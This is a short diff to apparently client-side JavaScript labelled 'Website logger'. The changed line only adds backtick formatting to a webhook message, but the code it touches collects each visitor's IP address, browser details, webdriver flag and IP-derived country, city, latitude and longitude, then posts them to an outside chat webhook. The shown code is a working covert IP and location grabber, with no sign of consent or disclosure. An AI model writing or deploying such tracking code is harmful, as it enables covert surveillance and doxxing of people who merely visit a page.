@@ -51,7 +51,7 @@
                 var params = 
                 {username: "Website logger", avatar_url: "", content: "", 
                 embeds: [{title: "User Logged on `" + cDay + "/" + cMonth + "/" + cYear + " | " + cHour + ":" + cMin + ":" + cSec + "`", color: 1752220,
-                description: "**IP: **`" + data.ip + "`" + "\n**Language: **`" + navigator.language + "`" + "\n**User Agent: **`" +  navigator.userAgent + "`" + "\n\n**OS: **` " + navigator.platform + "`" + "\n**Webdriver: **`" + navigator.webdriver + "`" + "\n**Version: **`" + navigator.appVersion + "`" + "\n**Country: **" + ipapi.country_name + "\n**City: **" + ipapi.city + "\n**Latitude: **" + ipapi.latitude + "\n**Longitude: **" + ipapi.longitude}]}
+                description: "**IP: **`" + data.ip + "`" + "\n**Language: **`" + navigator.language + "`" + "\n**User Agent: **`" +  navigator.userAgent + "`" + "\n\n**OS: **` " + navigator.platform + "`" + "\n**Webdriver: **`" + navigator.webdriver + "`" + "\n**Version: **`" + navigator.appVersion + "`" + "\n**Country: **`" + ipapi.country_name + "`" + "\n**City: **`" + ipapi.city + "`" + "\n**Latitude: **`" + ipapi.latitude + "`" + "\n**Longitude: **`" + ipapi.longitude + "`"}]}
                 request.send(JSON.stringify(params));
 
             })
